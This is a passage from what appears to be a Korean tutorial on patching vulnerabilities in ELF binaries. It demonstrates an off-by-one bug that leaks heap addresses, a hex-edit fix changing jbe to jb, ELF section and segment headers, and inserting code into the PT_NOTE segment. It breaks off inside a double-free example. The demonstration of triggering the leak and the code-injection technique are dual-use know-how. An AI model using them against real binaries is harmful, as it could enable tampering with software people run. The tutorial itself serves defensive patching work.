&#125;</span><br><span class="line">      *((_BYTE *)v4 + (<span class="type">int</span>)i) = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry, not enough space&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>그런데 반복문의 탈출 조건을 잘 보면 <code>i &lt; v2</code> 가 아닌 <code>i &lt;= v2</code> 로, 길이만큼 입력받도록 한 개발자의 의도와는 달리 실제로는 한 바이트를 더 입력할 수 있습니다. 만약 허용되는 최대 길이인 16을 입력한 후 17바이트를 입력한다면, 마지막 바이트는 구조체의 오프셋 16에 저장되면서 해당 위치에 있는 길이 값을 아래 그림과 같이 덮어쓸 것입니다.</p>
<p><img src="/images/binary-patching/2.png" alt="2.png"></p>
<p>show 메뉴에 해당하는 <code>show_data</code> 함수를 보면 오프셋 16의 5행에서 반복문의 탈출 조건에 사용되고 있습니다. 반복문은 구조체의 내용을 1바이트씩 출력하므로, 길이 값이 모두 몇 바이트를 출력할지 결정하고 있는 것입니다. 위의 그림과 같이 길이 값이 16보다 큰 값으로 오염된 상태라면, 힙 메모리에 대한 out-of-bounds 읽기가 발생하여 메모리 주소가 노출되는 취약점으로까지 연계될 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">show_data</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_DWORD *)(a1 + <span class="number">16</span>) &gt; i; ++i )</span><br><span class="line">    write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>실제로 길이 값이 오염된 구조체 이후에 해제된 힙 메모리가 위치하도록 한 후, show 메뉴를 이용해 출력해보면 힙 영역의 메모리 주소가 노출되는 것을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">[DEBUG] Received 0x2 bytes:</span><br><span class="line">    b&#x27;&gt; &#x27;</span><br><span class="line">&gt; 3</span><br><span class="line">...</span><br><span class="line">aaaaaaaaaaaa[DEBUG] Received 0x42 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 00 00 00  00 00 00 00  21 00 00 00  │aaaa│a···│····│!···│</span><br><span class="line">    00000010  00 00 00 00  42 5a 7d 5d  05 00 00 00  b7 84 16 a4  │····│BZ&#125;]│····│····│</span><br><span class="line">    00000020  7d 43 8d e4  04 00 00 00  00 00 00 00  21 00 00 00  │&#125;C··│····│····│!···│</span><br><span class="line">    00000030  00 00 00 00  63 63 63 00  00 00 00 00  00 00 00 00  │····│ccc·│····│····│</span><br><span class="line">    00000040  00 00                                               │··│</span><br><span class="line">    00000042</span><br><span class="line">aaaaa!BZ&#125;]���&#125;C��!ccc[DEBUG] Received 0x46 bytes:</span><br></pre></td></tr></table></figure>
<p>이와 같이 <code>add_data</code> 함수에 존재하는 off-by-one 버그를 헥스 에디터를 사용해 패치하여 취약점을 보완해 보겠습니다. 우선 디스어셈블러를 이용해 버그의 원인이 된 반복문 탈출 조건이 <code>add_data</code> 함수에서 어떤 인스트럭션에 해당하는지 조사해야 합니다. 다음은 GDB로 <code>add_data</code> 함수를 디스어셈블한 결과의 일부입니다. 반복문의 카운터 역할을 하는 <code>[rbp-0x14]</code> 에 1을 더하고 지역 변수 <code>[rbp-0x18]</code> 과 비교하는 부분에서 탈출 조건에 해당하는 코드임을 알 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass add_data</span><br><span class="line">Dump of assembler code for function add_data:</span><br><span class="line">...</span><br><span class="line">   0x0000000000001428 &lt;+221&gt;:   add    DWORD PTR [rbp-0x14],0x1</span><br><span class="line">   0x000000000000142c &lt;+225&gt;:   mov    edx,DWORD PTR [rbp-0x14]</span><br><span class="line">   0x000000000000142f &lt;+228&gt;:   mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">   0x0000000000001432 &lt;+231&gt;:   cmp    edx,eax</span><br><span class="line">   0x0000000000001434 &lt;+233&gt;:   jbe    0x13eb &lt;add_data+160&gt;</span><br><span class="line">   0x0000000000001436 &lt;+235&gt;:   mov    rax,QWORD PTR [rbp-0x10]</span><br></pre></td></tr></table></figure>
<p>여기서 정확히 off-by-one 버그의 정확한 원인이 되는 인스트럭션은 <code>main+233</code> 의 <code>jbe</code> 인스트럭션입니다. <code>jbe</code> 인스트럭션은 &quot;jump if below or equal&quot;을 의미하는 조건부 점프 인스트럭션으로, 버그를 패치하기 위해서는 &quot;jump below&quot;에 해당하는 <code>jb</code> 인스트럭션으로 바꿔야 합니다.</p>
<p>그런데 GDB의 내장 디스어셈블러가 편의상 <code>jbe 0x13eb</code> 와 같이 출력하는 것과 달리, 조건부 점프 인스트럭션은 실제로는 점프할 주소까지의 상대적인 오프셋을 인자로 인코딩합니다. 따라서 먼저 바꿔야 하는 인스트럭션의 정확한 opcode를 확인한 후, 인자를 정확하게 표현하는 디스어셈블러로 인스트럭션의 원래 형태를 파악하는 것이 좋습니다. GDB를 사용하여 확인한 <code>jbe</code> 인스트럭션의 opcode는 <code>\x76\xb5</code> 입니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/2bx 0x1434</span><br><span class="line">0x1434 &lt;add_data+233&gt;:  0x76    0xb5</span><br></pre></td></tr></table></figure>
<p>인스트럭션의 디스어셈블과 어셈블에는 shell-storm.org에서 운영하는 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">웹페이지</a>를 사용하는 방법이 가장 간단합니다. 아래와 같이 웹페이지 하단에서 opcode를 입력하고 x86 (64)를 선택한 다음 Disassemble 버튼을 클릭하면, 인스트럭션의 원래 형태는 <code>jbe 0xffffffffffffffb7</code> 임을 파악할 수 있습니다.</p>
<p><img src="/images/binary-patching/3.png" alt="3.png"></p>
<p>다음으로 웹페이지 상단에서 <code>jb 0xffffffffffffffb7</code> 를 입력한 후 동일하게 Assemble 버튼을 클릭하면, 새로 바꿀 opcode <code>\x72\xb5</code> 를 얻을 수 있습니다.</p>
<p><img src="/images/binary-patching/4.png" alt="4.png"></p>
<p>이제 헥스 에디터를 이용하여 바이너리를 수정할 차례입니다. 헥스 에디터는 무료 소프트웨어인 <a href="https://mh-nexus.de/en/hxd/">HxD</a>, 상용 소프트웨어인 <a href="https://www.sweetscape.com/010editor/">010 Editor</a> 등 잘 알려진 소프트웨어가 많으므로 자신이 사용하기 편한 것을 사용하면 됩니다. 이 글에서는 편의상 커맨드라인에서 편집이 가능한 hexedit을 사용하겠습니다. hexedit은 APT를 이용하여 설치할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install hexedit -y</span><br></pre></td></tr></table></figure>
<p>hexedit은 인자로 바이너리의 경로를 전달하여 실행합니다. 주요 단축키는 다음과 같습니다.</p>
<table>
<thead>
<tr>
<th>단축키</th>
<th>기능</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+G</td>
<td>지정한 파일 오프셋으로 이동</td>
</tr>
<tr>
<td>F2</td>
<td>저장</td>
</tr>
<tr>
<td>Ctrl+X</td>
<td>저장하고 종료</td>
</tr>
<tr>
<td>Ctrl+C</td>
<td>저장하지 않고 종료</td>
</tr>
</tbody>
</table>
<p><code>main</code> 바이너리의 복사본 <code>main.patched</code> 를 만들고 hexedit으로 열어 오프셋 <code>0x1434</code> 로 이동하면 아래와 같이 원래의 인스트럭션에 해당하는 <code>76 b5</code> 가 있습니다.</p>
<p><img src="/images/binary-patching/5.png" alt="5.png"></p>
<p>새로 바꿀 opcode인 <code>72 b5</code> 를 입력하고, 저장한 후 종료합니다. 패치된 바이너리의 <code>add_data</code> 함수를 GDB로 디스어셈블해보면 <code>jbe</code> 인스트럭션이 <code>jb</code> 로 바뀐 것을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass add_data</span><br><span class="line">Dump of assembler code for function add_data:</span><br><span class="line">...</span><br><span class="line">   0x0000000000001428 &lt;+221&gt;:   add    DWORD PTR [rbp-0x14],0x1</span><br><span class="line">   0x000000000000142c &lt;+225&gt;:   mov    edx,DWORD PTR [rbp-0x14]</span><br><span class="line">   0x000000000000142f &lt;+228&gt;:   mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">   0x0000000000001432 &lt;+231&gt;:   cmp    edx,eax</span><br><span class="line">   0x0000000000001434 &lt;+233&gt;:   jb     0x13eb &lt;add_data+160&gt;</span><br><span class="line">   0x0000000000001436 &lt;+235&gt;:   mov    rax,QWORD PTR [rbp-0x10]</span><br></pre></td></tr></table></figure>
<p>패치된 바이너리는 앞서 힙 메모리가 노출되도록 하였던 입력을 전달하여도 더 이상 구조체의 길이 필드가 오염되지 않아 트리거에 실패합니다. 따라서 off-by-one 버그로 인해 발생하였던 취약점이 잘 보완되었음을 알 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./main.patched</span><br><span class="line">...</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt; 3</span><br><span class="line">index: 0</span><br><span class="line">aaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<h2 id="%EC%BD%94%EB%93%9C%EB%A5%BC-%EC%82%BD%EC%9E%85%ED%95%B4%EC%95%BC-%ED%95%98%EB%8A%94-%EA%B2%BD%EC%9A%B0" tabindex="-1">코드를 삽입해야 하는 경우</h2>
<p>이전 문단에서는 간단한 수정이 필요한 경우 헥스 에디터를 사용하여 바이너리를 패치하는 방법을 살펴보았습니다. 그러나 이 방법은 앞서 언급하였던 대로 수정해야 할 내용이 조금만 늘어나도 바꿀 코드를 위치시킬 공간이 부족하여 적용하기 어렵습니다. 예를 들어 패치할 함수가 입력값에 대한 검증을 충분히 하고 있지 않아 검증하는 코드를 직접 추가해야 하는 경우에는 직접 바이너리에 새로운 코드를 삽입하여 메모리에 로드한 후 분기나 호출 부분을 수정하여 실행 흐름을 옮겨야 합니다.</p>
<p>코드를 삽입해야 하는 경우는 새로운 코드를 메모리상에서 로드할 위치와, 기존의 실행 흐름을 돌려 새로운 코드를 실행할 방법을 모두 고려하여야 합니다. 이 글에서는 바이너리에서 실제 동작과 무관한 부분에 코드를 삽입하고, 실행 가능한 영역으로 변경하여 로드하는 방법을 소개합니다. 이 방법의 이해를 위해서는 바이너리의 섹션과 세그먼트 개념에 대한 기초적인 숙지가 필요합니다.</p>
<h3 id="%EC%84%B9%EC%85%98%EA%B3%BC-%EC%84%B8%EA%B7%B8%EB%A8%BC%ED%8A%B8" tabindex="-1">섹션과 세그먼트</h3>
<p>바이너리의 코드와 데이터들은 논리적으로 섹션(sections)이라는 부분들로 구분되어 있습니다. 모든 섹션에 대해 섹션의 성질이나 섹션에 해당하는 바이트들의 위치를 나타내는 섹션 헤더(section headers)가 존재하며, 모든 섹션 헤더는 섹션 헤더 테이블에 위치하고 있습니다. 유의해야 할 내용은 섹션의 구분은 링커(linker)의 편의를 위한 것으로, 프로세스를 실행하기 위해 모든 섹션이 필요한 것은 아니라는 점입니다.</p>
<p>다음은 <code>/usr/include/elf.h</code> 파일에 정의된 섹션 헤더의 구조입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    sh_name;        <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word    sh_type;        <span class="comment">/* Section type */</span></span><br><span class="line">  Elf64_Xword   sh_flags;       <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf64_Addr    sh_addr;        <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off sh_offset;      <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf64_Xword   sh_size;        <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf64_Word    sh_link;        <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word    sh_info;        <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword   sh_addralign;       <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xword   sh_entsize;     <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p>섹션 헤더에서 눈여겨볼 필드들은 다음과 같습니다.</p>
<ul>
<li><code>sh_type</code> 필드는 섹션의 타입을 나타내며, 타입은 섹션의 내용 및 구조에 대한 정보를 알려줍니다.
<ul>
<li><code>SHT_PROGBITS</code> 타입은 섹션이 인스트럭션이나 상수와 같은 프로그램 데이터로 이루어져 있음을 나타냅니다.</li>
</ul>
</li>
<li><code>sh_flags</code> 필드는 섹션 플래그들이며, 섹션에 대한 추가적인 정보를 나타냅니다.
<ul>
<li><code>SHF_WRITE</code> 플래그는 섹션이 런타임에 쓰기 가능함을 나타냅니다.</li>
<li><code>SHF_ALLOC</code> 플래그는 섹션의 내용물이 바이너리를 실행할 때 가상 메모리로 로드됨을 나타냅니다.</li>
<li><code>SHF_EXECINSTR</code> 플래그는 섹션이 실행 가능한 인스트럭션들을 포함하고 있음을 나타냅니다.</li>
</ul>
</li>
<li><code>sh_addr</code> , <code>sh_offset</code> , <code>sh_size</code> 는 각각 섹션의 가상 주소, 파일 오프셋과 크기를 나타냅니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SHT_PROGBITS      1             <span class="comment">/* Program data */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_WRITE            (1 &lt;&lt; 0)   <span class="comment">/* Writable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_ALLOC            (1 &lt;&lt; 1)   <span class="comment">/* Occupies memory during execution */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHF_EXECINSTR        (1 &lt;&lt; 2)   <span class="comment">/* Executable */</span></span></span><br></pre></td></tr></table></figure>
<p>readelf 도구를 이용하여 ELF 바이너리의 섹션에 대한 정보를 확인할 수 있습니다. 다음은 아래의 실습 문단에서 사용할 <code>example2/main</code> 바이너리의 섹션 정보를 확인한 예시입니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf --sections --wide main</span><br><span class="line">There are 31 section headers, starting at offset 0x3978:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        0000000000000318 000318 00001c 00   A  0   0  1</span><br><span class="line">  [ 2] .note.gnu.property NOTE            0000000000000338 000338 000030 00   A  0   0  8</span><br><span class="line">  [ 3] .note.gnu.build-id NOTE            0000000000000368 000368 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE            000000000000038c 00038c 000020 00   A  0   0  4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH        00000000000003b0 0003b0 000030 00   A  6   0  8</span><br><span class="line">  [ 6] .dynsym           DYNSYM          00000000000003e0 0003e0 0001e0 18   A  7   1  8</span><br><span class="line">  [ 7] .dynstr           STRTAB          00000000000005c0 0005c0 000108 00   A  0   0  1</span><br><span class="line">  [ 8] .gnu.version      VERSYM          00000000000006c8 0006c8 000028 02   A  6   0  2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED         00000000000006f0 0006f0 000050 00   A  7   1  8</span><br><span class="line">  [10] .rela.dyn         RELA            0000000000000740 000740 0000f0 18   A  6   0  8</span><br><span class="line">  [11] .rela.plt         RELA            0000000000000830 000830 000120 18  AI  6  24  8</span><br><span class="line">  [12] .init             PROGBITS        0000000000001000 001000 00001b 00  AX  0   0  4</span><br><span class="line">  [13] .plt              PROGBITS        0000000000001020 001020 0000d0 10  AX  0   0 16</span><br><span class="line">  [14] .plt.got          PROGBITS        00000000000010f0 0010f0 000010 10  AX  0   0 16</span><br><span class="line">  [15] .plt.sec          PROGBITS        0000000000001100 001100 0000c0 10  AX  0   0 16</span><br><span class="line">  [16] .text             PROGBITS        00000000000011c0 0011c0 000539 00  AX  0   0 16</span><br><span class="line">  [17] .fini             PROGBITS        00000000000016fc 0016fc 00000d 00  AX  0   0  4</span><br><span class="line">  [18] .rodata           PROGBITS        0000000000002000 002000 00008e 00   A  0   0  4</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS        0000000000002090 002090 00005c 00   A  0   0  4</span><br><span class="line">  [20] .eh_frame         PROGBITS        00000000000020f0 0020f0 000148 00   A  0   0  8</span><br><span class="line">  [21] .init_array       INIT_ARRAY      0000000000003d60 002d60 000008 08  WA  0   0  8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY      0000000000003d68 002d68 000008 08  WA  0   0  8</span><br><span class="line">  [23] .dynamic          DYNAMIC         0000000000003d70 002d70 0001f0 10  WA  7   0  8</span><br><span class="line">  [24] .got              PROGBITS        0000000000003f60 002f60 0000a0 08  WA  0   0  8</span><br><span class="line">  [25] .data             PROGBITS        0000000000004000 003000 000010 00  WA  0   0  8</span><br><span class="line">  [26] .bss              NOBITS          0000000000004010 003010 000020 00  WA  0   0 16</span><br><span class="line">  [27] .comment          PROGBITS        0000000000000000 003010 00002b 01  MS  0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          0000000000000000 003040 000510 18     29  18  8</span><br><span class="line">  [29] .strtab           STRTAB          0000000000000000 003550 000309 00      0   0  1</span><br><span class="line">  [30] .shstrtab         STRTAB          0000000000000000 003859 00011a 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>
<p>섹션의 구분은 링커의 편의를 위한 것입니다. 반면 바이너리를 로드할 때 관련있는 코드나 데이터를 함께 취급하거나, 특정 영역의 데이터를 로드할지 여부를 결정하기 위해서 바이너리를 세그먼트(segments) 관점으로도 구분합니다. 세그먼트는 단순히 여러 섹션을 하나로 합쳐 놓은 것입니다. 섹션과 마찬가지로, 모든 세그먼트에 대해 세그먼트의 정보를 나타내는 프로그램 헤더(program headers)가 존재합니다. 모든 프로그램 헤더는 바이너리에서 프로그램 헤더 테이블에 위치하고 있습니다.</p>
<p>다음은 <code>/usr/include/elf.h</code> 파일에 정의된 프로그램 헤더의 구조입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    p_type;         <span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word    p_flags;        <span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off p_offset;       <span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr    p_vaddr;        <span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr    p_paddr;        <span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword   p_filesz;       <span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword   p_memsz;        <span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword   p_align;        <span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>
<p>프로그램 헤더에서 눈여겨볼 필드들은 다음과 같습니다.</p>
<ul>
<li><code>p_type</code> 필드는 세그먼트의 타입을 나타냅니다.
<ul>
<li><code>PT_LOAD</code> 타입은 프로세스를 실행할 때 메모리에 로드되는 세그먼트를 나타냅니다.</li>
</ul>
</li>
<li><code>p_flags</code> 필드는 세그먼트 플래그로, 세그먼트에 대한 런타임에서의 권한을 나타냅니다.
<ul>
<li><code>PF_X</code> , <code>PF_W</code> , <code>PF_R</code> 플래그는 각각 런타임에서 실행 가능, 쓰기 가능, 읽기 가능함을 나타냅니다.</li>
</ul>
</li>
<li><code>p_offset</code> , <code>p_vaddr</code> , <code>p_filesz</code> 필드는 각각 세그먼트의 파일 오프셋, 가상 주소와 크기를 나타냅니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOAD         1               <span class="comment">/* Loadable program segment */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_X            (1 &lt;&lt; 0)        <span class="comment">/* Segment is executable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_W            (1 &lt;&lt; 1)        <span class="comment">/* Segment is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_R            (1 &lt;&lt; 2)        <span class="comment">/* Segment is readable */</span></span></span><br></pre></td></tr></table></figure>
<p>세그먼트에 대한 정보도 readelf를 사용하여 확인할 수 있습니다. 특히 어떤 섹션들이 어떤 세그먼트에 속하는지 대응 관계를 보면, 세그먼트는 단지 여러 섹션이 합쳐진 것임을 분명히 알 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf --segments --wide main</span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Position-Independent Executable file)</span><br><span class="line">Entry point 0x11c0</span><br><span class="line">There are 13 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align</span><br><span class="line">  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0002d8 0x0002d8 R   0x8</span><br><span class="line">  INTERP         0x000318 0x0000000000000318 0x0000000000000318 0x00001c 0x00001c R   0x1</span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br><span class="line">  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000950 0x000950 R   0x1000</span><br><span class="line">  LOAD           0x001000 0x0000000000001000 0x0000000000001000 0x000709 0x000709 R E 0x1000</span><br><span class="line">  LOAD           0x002000 0x0000000000002000 0x0000000000002000 0x000238 0x000238 R   0x1000</span><br><span class="line">  LOAD           0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002b0 0x0002d0 RW  0x1000</span><br><span class="line">  DYNAMIC        0x002d70 0x0000000000003d70 0x0000000000003d70 0x0001f0 0x0001f0 RW  0x8</span><br><span class="line">  NOTE           0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8</span><br><span class="line">  NOTE           0x000368 0x0000000000000368 0x0000000000000368 0x000044 0x000044 R   0x4</span><br><span class="line">  GNU_PROPERTY   0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8</span><br><span class="line">  GNU_EH_FRAME   0x002090 0x0000000000002090 0x0000000000002090 0x00005c 0x00005c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002a0 0x0002a0 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .interp</span><br><span class="line">   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt</span><br><span class="line">   03     .init .plt .plt.got .plt.sec .text .fini</span><br><span class="line">   04     .rodata .eh_frame_hdr .eh_frame</span><br><span class="line">   05     .init_array .fini_array .dynamic .got .data .bss</span><br><span class="line">   06     .dynamic</span><br><span class="line">   07     .note.gnu.property</span><br><span class="line">   08     .note.gnu.build-id .note.ABI-tag</span><br><span class="line">   09     .note.gnu.property</span><br><span class="line">   10     .eh_frame_hdr</span><br><span class="line">   11</span><br><span class="line">   12     .init_array .fini_array .dynamic .got</span><br></pre></td></tr></table></figure>
<h3 id="pt_note-%EC%84%B8%EA%B7%B8%EB%A8%BC%ED%8A%B8%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%BD%94%EB%93%9C-%EC%82%BD%EC%9E%85" tabindex="-1"><code>PT_NOTE</code> 세그먼트를 이용한 코드 삽입</h3>
<p>바이너리를 실행하기 위해 모든 섹션이 필요한 것은 아닙니다. 다시 말해 바이너리에서 실행에 필요한 코드나 데이터와는 무관한 공간들이 존재한다는 것입니다. 만약 이 공간에 추가할 코드를 삽입하고, 섹션 헤더와 프로그램 헤더를 변경하여 메모리에 로드해야 하는 코드인 것처럼 꾸미면 우리는 삽입한 코드를 바이너리의 일부였던 것처럼 실행할 수 있습니다.</p>
<p>바이너리의 <code>PT_NOTE</code> 세그먼트와, 이 세그먼트를 구성하는 <code>.note.*</code> 섹션들은 특히 코드를 삽입하기 좋은 공간입니다. 원래 <code>.note.*</code> 섹션들은 아래 <code>file</code> 커맨드의 실행 결과에서 “BuildID[sha1]~” 부분과 같이 바이너리의 빌드 id나 제조사와 같은 추가적인 정보를 담기 위해 존재하는 공간입니다. 내용이 없어지거나 변형되어도 실행에 전혀 문제가 되지 않으며, 애초에 프로세스의 실행 도중에는 참조조차 되지 않는 데이터들입니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file main</span><br><span class="line">main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fb87af9c421d9b446165d9c00800df1664135edc, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
<p>앞서 readelf로 세그먼트를 확인한 예시를 보면 오프셋 <code>0x368</code> 에 존재하는 <code>PT_NOTE</code> 타입의 8번 세그먼트는 <code>.note.gnu.build-id</code> , <code>.note.ABI-tag</code> 의 두 개 섹션으로 이루어져 있고, 68바이트의 공간을 차지하는 읽기 전용 세그먼트입니다. 바이너리의 특정 함수에 인자를 검증하는 로직을 추가해야 한다고 가정해 보겠습니다. 추가할 코드를 해당 세그먼트에 삽입하고 기존 코드를 패치해 분기하도록 한 후, 아래와 같이 섹션 헤더와 프로그램 헤더를 변경하면 실행 흐름을 옮길 수 있습니다.</p>
<p><img src="/images/binary-patching/6.png" alt="6.png"></p>
<p>이 방법을 조금 응용하면 코드의 크기가 68바이트보다 크다고 하여도 새로운 섹션 자체를 추가하여 삽입할 수 있습니다. 코드를 바이너리의 끝부분 이후에 삽입하여 새로운 공간을 만든 후, 섹션 헤더와 프로그램 헤더를 변경하여 새로운 공간의 오프셋을 가리키도록 하면 됩니다. 다만 이 경우에는 가상 주소와 오프셋 필드뿐만 아니라 크기 필드까지 새로운 공간의 크기에 해당하는 값으로 변경해야 합니다. 또한 바이너리의 크기나 섹션의 위치 등을 변경할 수 없다는 제약이 있다면 적용할 수 없습니다.</p>
<h3 id="double-free-%EB%B2%84%EA%B7%B8-%ED%8C%A8%EC%B9%98%ED%95%98%EA%B8%B0" tabindex="-1">double free 버그 패치하기</h3>
<p>이번에는 바이너리에 존재하는 double free 버그를 코드를 삽입하는 방법으로 패치해 보겠습니다. <code>example2/main</code> 파일이 패치할 바이너리이며, 핵심적인 로직은 이전의 <code>example1/main</code> 바이너리와 거의 차이가 없습니다.</p>
<p><code>main</code> 함수를 보면 add 메뉴의 경우 22행에서 <code>add_data</code> 함수가 반환한 구조체 포인터를 <code>s[i]</code> 에 저장합니다. <code>s</code> 는 스택에 존재하는 배열이며, <code>i</code> 는 16행의 반복문에서 <code>s[i]</code> 가 <code>NULL</code> 인 인덱스를 자동으로 선택합니다. delete 메뉴에 해당하는 33행은 인덱스 <code>i</code> 를 입력받고, 16보다 작다면 <code>s[i]</code> 가 가리키는 구조체를 해제하기 위해 <code>delete_data</code> 함수를 호출합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-9Ch] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  __int64 s[<span class="number">18</span>]; <span class="comment">// [rsp+10h] [rbp-90h] 